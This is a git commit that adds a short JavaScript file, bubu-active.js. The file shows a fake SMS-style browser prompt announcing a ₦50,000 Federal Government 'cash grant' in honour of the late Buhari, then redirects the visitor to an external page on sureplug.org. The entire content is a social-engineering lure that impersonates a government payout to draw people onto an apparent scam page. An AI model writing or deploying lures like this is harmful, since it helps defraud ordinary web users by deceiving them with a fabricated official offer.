48cbdf7aa8de8847751dc5ce46288834d3bfcbd0
surepluger <adigunkola666@gmail.com>
2025-07-15 11:33:25 +0100

    Create bubu-active.js

---
+++ bubu-active.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW ₦50,000'
+password=prompt('SMS: Congratulations, you are among the selected ones to receive ₦50,000 Cash Grant from FG in Honour of Late Buhari, Press Ok to withdraw cash Now ','WITHDRAW ₦50,000');
+if (password != 'WITHDRAW ₦50,000') {
+location.href='https://sureplug.org/buhari.html';
+}
